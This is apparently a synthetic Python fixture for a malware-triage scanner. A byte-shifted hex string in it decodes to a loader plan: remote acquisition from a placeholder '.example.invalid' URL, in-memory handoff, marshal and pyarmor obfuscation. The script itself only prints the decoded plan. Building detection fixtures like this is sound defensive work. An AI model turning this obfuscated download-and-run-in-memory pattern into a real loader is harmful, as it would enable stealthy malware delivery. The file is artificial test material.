#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_cfcdd5b3 = "5e251a645b5c4d585b25494b595d515a4d475a4d55575c4d144c515b58495c4b5047554d55575a6164494c49585c4d5a255a4d595d4d5b5c5b475b5c61544d47554d55575a61645b5c494f4d474b575d565c2519645b61565c4960254d604b4d585c515756474d60585a4d5b5b51575664574a4e5d5b4b495c5157562555495a5b504954474d565e4d5457584d4758544956644b495a5a514d5a255861495a55575a47574a4e5d5b4b495c4d4c645f51564c575f5b474b50495156255f5b4b5a51585c475c574758615c505756644b49555849514f5647514c254b49555849514f56154b20184a4d4d4e181b4a645d5a5425505c5c585b2217174b20184a4d4d4e181b4a164d60495558544d1651565e4954514c171e491c4a201f1c1e165861645d5b4d5a47494f4d565c25305d565c5a4d5b5b38615c505756174b20184a4d4d4e181b4a"
    CODEC_cfcdd5b3 = "hex_literal|subtract_modulo_256|18"

    def load_cfcdd5b3():
        return bytes.fromhex(MATERIAL_cfcdd5b3)

    def decode_cfcdd5b3(e):
        return bytes((value + 24) % 256 for value in e)

    def recover_cfcdd5b3():
        n = 19 * 7 - 133
        d = decode_cfcdd5b3(load_cfcdd5b3())
        t = d.decode("ascii", "strict")
        return t

    def inspect_cfcdd5b3():
        return recover_cfcdd5b3()

    def surface_cfcdd5b3():
        try:
            raise LookupError("surface")
        except LookupError:
            return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

    def obfuscation_cfcdd5b3():
        marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
        return marshal_plan["label"]

    def plan_cfcdd5b3():
        fields = dict(item.split("=", 1) for item in inspect_cfcdd5b3().split("|"))
        analysis_surface = surface_cfcdd5b3()
        obfuscation_surface = obfuscation_cfcdd5b3()
        operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_cfcdd5b3())
